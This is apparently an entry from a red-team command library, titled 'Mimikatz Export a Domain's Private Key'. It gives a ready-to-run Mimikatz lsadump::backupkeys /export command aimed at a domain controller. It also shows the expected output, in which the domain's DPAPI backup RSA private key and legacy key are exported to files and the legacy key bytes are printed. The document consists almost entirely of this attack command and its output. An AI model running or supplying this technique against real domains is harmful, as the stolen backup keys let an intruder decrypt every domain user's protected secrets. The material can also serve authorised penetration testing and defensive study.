---
id: ec270588-5eff-43a9-96e4-921a5cfc6265
name: Mimikatz Export a Domain's Private Key
type: command
executor: command_prompt
data: mimikatz.exe "lsadump::backupkeys /system:$_DOMAIN_CONTROLLER.$_DOMAIN /export"
  "exit"
output: "C:\\Windows\\system32\\spool\\drivers\\color>mimikatz.exe \"lsadump::backupkeys\
  \ /system:dc-dev.dev.tesla.local /export\" \"exit\"\n\n  .#####.   mimikatz 2.2.0\
  \ (x64) #19041 May 19 2020 00:48:59\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n\
  \ ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ##\
  \ \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent\
  \ LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com\
  \ / http://mysmartlogon.com   ***/\n\nmimikatz(commandline) # lsadump::backupkeys\
  \ /system:dc-dev.dev.tesla.local /export\n\nCurrent prefered key:       {bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2}\n\
  \  * RSA key\n        |Provider name : Microsoft Strong Cryptographic Provider\n\
  \        |Unique name   :\n        |Implementation: CRYPT_IMPL_SOFTWARE ;\n    \
  \    Algorithm      : CALG_RSA_KEYX\n        Key size       : 2048 (0x00000800)\n\
  \        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT\
  \ ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )\n        Exportable key : YES\n   \
  \     Private export : OK - 'ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.keyx.rsa.pvk'\n\
  \        PFX container  : OK - 'ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.pfx'\n\
  \        Export         : OK - 'ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.der'\n\
  \nCompatibility prefered key: {8a124295-3d67-4d08-b9ab-01f10eae9ec5}\n  * Legacy\
  \ key\n5288bd5444f131c043c14e882d54dd2949fde8a81491e920d5418799d7d80cbc\n9068faf3b2043dc290d1ca6a7ab99339c57c39baddfc8618289d0fe58dd80d79\n\
  543d959fcf4a80d8ec3c7a296627c4237a30ba994db661924997cd5c88744de7\n0019805b94486fb563fb4d553969f343230a7476e24201dd4604a4cb58923f0e\n\
  fdb50ce79e5937f58608c42bc1430b4f0fad4090b86b4cd7a047320650b86393\ne239de8c2a77ba76c98336df02236d8feb6669494eb0074613593286bd43f81f\n\
  bfd215d8416ad6dea44407ba14be9795f6d3c70350126c3021cea8945f7e6dd3\n2d7643e264448ff799e3f59bec2085ef9efd5ae9439b54abb171127e736e39c5\n\
  \n        Export         : OK - 'ntds_legacy_0_8a124295-3d67-4d08-b9ab-01f10eae9ec5.key'\n\
  \nmimikatz(commandline) # exit\nBye!"
created_at: '2020-07-21T06:52:31.032892+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Export a Domain's Private Key

```command_prompt
mimikatz.exe "lsadump::backupkeys /system:$_DOMAIN_CONTROLLER.$_DOMAIN /export" "exit"
```

## Expected Output

```
C:\Windows\system32\spool\drivers\color>mimikatz.exe "lsadump::backupkeys /system:dc-dev.dev.tesla.local /export" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::backupkeys /system:dc-dev.dev.tesla.local /export

Current prefered key:       {bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2}
  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   :
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES
        Private export : OK - 'ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.keyx.rsa.pvk'
        PFX container  : OK - 'ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.pfx'
        Export         : OK - 'ntds_capi_0_bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2.der'

Compatibility prefered key: {8a124295-3d67-4d08-b9ab-01f10eae9ec5}
  * Legacy key
5288bd5444f131c043c14e882d54dd2949fde8a81491e920d5418799d7d80cbc
9068faf3b2043dc290d1ca6a7ab99339c57c39baddfc8618289d0fe58dd80d79
543d959fcf4a80d8ec3c7a296627c4237a30ba994db661924997cd5c88744de7
0019805b94486fb563fb4d553969f343230a7476e24201dd4604a4cb58923f0e
fdb50ce79e5937f58608c42bc1430b4f0fad4090b86b4cd7a047320650b86393
e239de8c2a77ba76c98336df02236d8feb6669494eb0074613593286bd43f81f
bfd215d8416ad6dea44407ba14be9795f6d3c70350126c3021cea8945f7e6dd3
2d7643e264448ff799e3f59bec2085ef9efd5ae9439b54abb171127e736e39c5

        Export         : OK - 'ntds_legacy_0_8a124295-3d67-4d08-b9ab-01f10eae9ec5.key'

mimikatz(commandline) # exit
Bye!
```
